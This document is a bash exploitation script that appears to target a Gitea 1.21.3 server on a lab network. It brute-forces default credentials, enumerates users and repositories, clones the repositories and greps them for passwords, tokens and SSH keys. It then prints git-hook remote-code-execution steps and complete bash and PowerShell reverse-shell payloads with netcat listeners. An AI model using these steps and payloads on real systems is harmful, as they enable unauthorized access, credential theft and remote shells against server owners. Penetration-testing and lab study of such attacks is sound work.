#!/bin/bash
# SYSTEM 4: LOCK - Enhanced Gitea Exploitation Script
# Based on Jenkins CVE-2024-23897 methodology (file read -> hash extraction -> RCE)
# Target: Gitea 1.21.3 on port 3000

S4_IP="10.129.6.226"
OUTPUT_DIR="$HOME/Downloads/system4_exploit_enhanced_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 4: LOCK - Enhanced Gitea Exploitation"
echo "Based on Jenkins CVE-2024-23897 Methodology"
echo "=========================================="
echo "Target: $S4_IP"
echo "Gitea: http://$S4_IP:3000"
echo ""

# ============================================
# PHASE 1: Gitea Status & Version Check
# ============================================
echo "[*] Phase 1: Gitea Status & Version Check"
echo ""

# Check Gitea version
echo "[+] Checking Gitea version..."
curl -s http://$S4_IP:3000/api/v1/version > 01_gitea_version.txt
VERSION=$(cat 01_gitea_version.txt | grep -oP '"version":"\K[^"]*' | head -1)
echo "Version: $VERSION"
echo "$VERSION" > gitea_version.txt

# Check if registration is enabled
echo ""
echo "[+] Checking if registration is enabled..."
curl -s http://$S4_IP:3000/user/sign_up > 02_registration_page.txt
if grep -qi "register\|sign.*up\|create.*account" 02_registration_page.txt 2>/dev/null; then
    echo "[!] Registration appears to be enabled!"
    echo "REGISTRATION_ENABLED" > registration_status.txt
else
    echo "[-] Registration might be disabled"
fi

# ============================================
# PHASE 2: File Read Attempts (Like CVE-2024-23897)
# ============================================
echo ""
echo "[*] Phase 2: File Read Attempts"
echo ""

echo "[+] Attempting to read system files via Gitea API..."
echo "Note: Gitea may have different file read vectors than Jenkins"

# Try to read files via various API endpoints
echo "[+] Trying to read /etc/passwd via raw file access..."
# Gitea raw file access: /{owner}/{repo}/raw/{branch}/{filepath}
# But we need a repo first, so this is limited

# Try to access configuration files
echo "[+] Attempting to access Gitea configuration..."
curl -s "http://$S4_IP:3000/api/v1/version" > 03_api_version.txt
curl -s "http://$S4_IP:3000/api/v1/settings/api" > 04_api_settings.txt

# ============================================
# PHASE 3: User Enumeration & Credential Discovery
# ============================================
echo ""
echo "[*] Phase 3: User Enumeration & Credential Discovery"
echo ""

# Search for users
echo "[+] Searching for users..."
curl -s "http://$S4_IP:3000/api/v1/users/search?q=admin" > 05_users_admin.txt
curl -s "http://$S4_IP:3000/api/v1/users/search?q=a" > 06_users_all.txt

cat 05_users_admin.txt | head -10
echo ""

# Enumerate public repositories
echo "[+] Enumerating public repositories..."
curl -s "http://$S4_IP:3000/api/v1/repos/search?limit=50" > 07_repos.txt
cat 07_repos.txt | grep -oP '"full_name":"\K[^"]*' | head -10

# Try default credentials
echo ""
echo "[+] Trying default credentials..."
for user in admin Admin gitea Gitea administrator Administrator root; do
    for pass in admin Admin gitea Gitea password Password123 admin123; do
        echo -n "Trying: $user:$pass ... "
        
        # Get CSRF token
        CSRF=$(curl -s -c cookies_temp.txt http://$S4_IP:3000/user/login | grep -oP 'name="_csrf" value="\K[^"]*')
        
        if [ -n "$CSRF" ]; then
            # Try login
            RESPONSE=$(curl -s -X POST http://$S4_IP:3000/user/login \
                -d "user_name=$user&password=$pass&_csrf=$CSRF" \
                -b cookies_temp.txt -c cookies_${user}_${pass}.txt \
                -L -o login_${user}_${pass}.html 2>&1)
            
            # Check if login was successful
            if grep -qi "dashboard\|repositories\|settings\|logout" login_${user}_${pass}.html 2>/dev/null; then
                echo "SUCCESS!"
                echo "$user:$pass" > CREDENTIALS_FOUND.txt
                echo "CREDENTIALS: $user:$pass" >> CREDENTIALS_FOUND.txt
                echo "$CSRF" > csrf_token.txt
                break 2
            else
                echo "failed"
            fi
        fi
    done
done

# ============================================
# PHASE 4: Hash Extraction (If Authenticated)
# ============================================
echo ""
echo "[*] Phase 4: Hash Extraction Attempts"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials found! Attempting to extract password hashes..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Gitea stores user data in database, but we can try to access user settings
    echo "[+] Attempting to access user settings..."
    curl -s -b cookies_${USER}_${PASS}.txt "http://$S4_IP:3000/user/settings" > 08_user_settings.html
    
    # Look for password hashes (unlikely in web UI, but check)
    if grep -i "password\|hash\|bcrypt\|sha" 08_user_settings.html 2>/dev/null; then
        echo "[!] Possible password information found!"
        grep -i "password\|hash\|bcrypt\|sha" 08_user_settings.html > 09_possible_hashes.txt
    fi
    
    echo "[+] Gitea stores passwords in database (not accessible via web)"
    echo "[+] Try accessing database files if file read is possible"
    
else
    echo "[-] No credentials found. Cannot extract hashes without authentication."
fi

# ============================================
# PHASE 5: Repository Credential Mining
# ============================================
echo ""
echo "[*] Phase 5: Repository Credential Mining"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials available! Mining repositories for credentials..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Clone repositories and search for credentials
    mkdir -p repos
    cd repos
    
    # Extract repository URLs from API
    if [ -f ../07_repos.txt ]; then
        grep -oP '"clone_url":"\K[^"]*' ../07_repos.txt | while read repo_url; do
            repo_name=$(basename "$repo_url" .git)
            echo "[+] Cloning $repo_name..."
            
            # Clone with credentials
            git clone "http://$USER:$PASS@${repo_url#http://}" "$repo_name" 2>&1 | head -5
            
            if [ -d "$repo_name" ]; then
                cd "$repo_name"
                echo "[+] Searching for credentials in $repo_name..."
                
                # Search for passwords, secrets, keys
                grep -r -i "password\|secret\|api.*key\|token\|private.*key" . 2>/dev/null | \
                    grep -v ".git" | head -20 > ../../credentials_${repo_name}.txt
                
                # Find config files
                find . -name ".env" -o -name "config.*" -o -name "*.config" -o -name "*.key" 2>/dev/null | \
                    grep -v ".git" > ../../config_files_${repo_name}.txt
                
                # Look for SSH keys
                find . -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | \
                    grep -v ".git" > ../../ssh_keys_${repo_name}.txt
                
                cd ..
            fi
        done
    fi
    
    cd ..
    
    # Summarize findings
    echo ""
    echo "[+] Credential mining summary:"
    find repos -name "credentials_*.txt" -exec cat {} \; 2>/dev/null | head -10
    find repos -name "ssh_keys_*.txt" -exec cat {} \; 2>/dev/null
    
else
    echo "[-] No credentials. Cannot mine repositories."
fi

# ============================================
# PHASE 6: Git Hooks RCE (Like Jenkins Pipeline)
# ============================================
echo ""
echo "[*] Phase 6: Git Hooks RCE (Pipeline-like Exploitation)"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials available! Attempting Git Hooks RCE..."
    
    CREDS=$(grep "^CREDENTIALS:" CREDENTIALS_FOUND.txt | cut -d: -f2- | tr -d ' ')
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    echo ""
    echo "=========================================="
    echo "GIT HOOKS RCE EXPLOITATION GUIDE"
    echo "=========================================="
    echo ""
    echo "Method 1: Post-Receive Hook (Recommended)"
    echo "1. Login to Gitea: http://$S4_IP:3000/user/login"
    echo "   Username: $USER"
    echo "   Password: $PASS"
    echo ""
    echo "2. Create a new repository"
    echo ""
    echo "3. Clone the repository locally:"
    echo "   git clone http://$USER:$PASS@$S4_IP:3000/$USER/REPO_NAME.git"
    echo ""
    echo "4. Create a post-receive hook:"
    echo "   cd REPO_NAME"
    echo "   mkdir -p .git/hooks"
    echo "   cat > .git/hooks/post-receive << 'EOF'"
    echo "   #!/bin/bash"
    echo "   bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
    echo "   EOF"
    echo "   chmod +x .git/hooks/post-receive"
    echo ""
    echo "5. Commit and push:"
    echo "   git add .git/hooks/post-receive"
    echo "   git commit -m 'Add hook'"
    echo "   git push"
    echo ""
    echo "6. Set up listener: nc -lvp 4444"
    echo ""
    echo "Method 2: Pre-Receive Hook"
    echo "Similar to above, but use .git/hooks/pre-receive"
    echo ""
    echo "Method 3: Gitea Actions/Webhooks (if available)"
    echo "Check Gitea settings for Actions or Webhooks configuration"
    echo ""
    
else
    echo "[-] No credentials. Git hooks RCE requires authentication."
fi

# ============================================
# PHASE 7: Search for Exploits
# ============================================
echo ""
echo "[*] Phase 7: Exploit Research"
echo ""

echo "[+] Searching for Gitea exploits..."
searchsploit gitea > 10_gitea_exploits.txt 2>&1
cat 10_gitea_exploits.txt | head -30

echo ""
echo "[+] Searching for Gitea 1.21.x specific exploits..."
searchsploit gitea 1.21 > 11_gitea_121_exploits.txt 2>&1
cat 11_gitea_121_exploits.txt

# ============================================
# PHASE 8: Reverse Shell Payloads
# ============================================
echo ""
echo "=========================================="
echo "REVERSE SHELL PAYLOADS"
echo "=========================================="
echo ""
echo "PowerShell Reverse Shell (Windows):"
echo 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"YOUR_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
echo ""
echo "Bash Reverse Shell:"
echo "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
echo ""
echo "Set up listener:"
echo "nc -lvp 4444"
echo ""

# ============================================
# SUMMARY
# ============================================
echo "=========================================="
echo "ENHANCED EXPLOITATION COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
echo ""
ls -lh "$OUTPUT_DIR" | head -20
echo ""
echo "Key Files:"
echo "- CREDENTIALS_FOUND.txt: Discovered credentials"
echo "- repos/: Cloned repositories (if any)"
echo "- credentials_*.txt: Found credentials in repos"
echo "- ssh_keys_*.txt: Found SSH keys in repos"
echo "- 10_gitea_exploits.txt: Available exploits"
echo ""
echo "Next Steps:"
echo "1. Review credentials (CREDENTIALS_FOUND.txt)"
echo "2. Check cloned repositories for secrets"
echo "3. Try Git hooks RCE manually"
echo "4. Research Gitea 1.21.3 specific CVEs"
echo "5. If SSH keys found, use them for access"

